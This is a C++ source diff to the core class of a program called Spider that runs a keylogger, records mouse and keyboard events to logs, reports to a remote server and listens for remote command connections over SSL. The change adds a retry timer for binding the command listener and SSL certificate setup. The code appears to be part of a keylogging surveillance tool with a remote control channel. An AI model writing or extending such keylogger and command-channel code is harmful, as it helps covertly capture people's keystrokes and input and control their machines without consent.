@@ -21,8 +21,9 @@ namespace spi
     class CSpiderCore
     {
     public:
-        explicit CSpiderCore(cfg::Config &conf) : _conf(conf),
-                                                  _logHandle(conf, _ctx)
+        explicit CSpiderCore(cfg::Config &conf) noexcept : _conf(conf),
+                                                           _retryAccTimer(_io, 0),
+                                                           _logHandle(conf, _ctx)
         {
             _log(logging::Info) << "Configuring Spider Client" << std::endl;
             _log(logging::Info) << "Using remote server " << conf.address << ":" << conf.port << std::endl;
@@ -32,7 +33,7 @@ namespace spi
             _log(logging::Info) << "Using '" << conf.logDir << "' to store logs" << std::endl;
         }
 
-        ~CSpiderCore()
+        ~CSpiderCore() noexcept
         {
             _log(logging::Info) << "Shutting down" << std::endl;
             _keyLogger->stop();
@@ -45,7 +46,6 @@ namespace spi
             __setupSigHandlers();
             if (!__setup())
                 return false;
-            __startAcceptor();
             _keyLogger->run();
             _log(logging::Info) << "Client started successfully" << std::endl;
             _io.run();
@@ -86,13 +86,31 @@ namespace spi
             _acc.onAccept(_sess->connection(), boost::bind(&CSpiderCore::__handleAccept, this, net::ErrorPlaceholder));
         }
 
-        bool __setup()
+        void __tryBind(const ErrorCode &err = {})
         {
-            _acc.bind(_conf.portAcceptor);
+            if (!err && !_acc.bind(_conf.portAcceptor)) {
+                _log(logging::Debug) << "Ready to accept a command connection" << std::endl;
+                __startAcceptor();
+            } else {
+                _log(logging::Warning) << "Unable to listen for a command connection: retrying in 10 seconds"
+                                       << std::endl;
+                _acc.close();
+                _retryAccTimer.setExpiry(10);
+                _retryAccTimer.asyncWait(boost::bind(&CSpiderCore::__tryBind, this, net::ErrorPlaceholder));
+            }
+        }
+
+        bool __setup() noexcept
+        {
+            if (!_ctx.usePrivateKeyFile(_conf.keyFile) || !_ctx.useCertificateFile(_conf.certFile)) {
+                _log(logging::Error) << "Failed setting up a valid SSL context" << std::endl;
+                return false;
+            }
+            __tryBind();
             _logHandle.setIOManager(_io);
             if (!_logHandle.setup())
                 return false;
-            _keyLogger->setup();
+            _keyLogger->setup(); //TODO: check
 
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                 _logHandle.appendEntry(event);
@@ -111,6 +129,8 @@ namespace spi
 
         net::IOManager _io;
         net::SSLContext _ctx{spi::net::SSLContext::SSLv23};
+
+        net::Timer _retryAccTimer;
         net::TCPAcceptor _acc{_io};
         ServerCommandSession *_sess{nullptr};
 
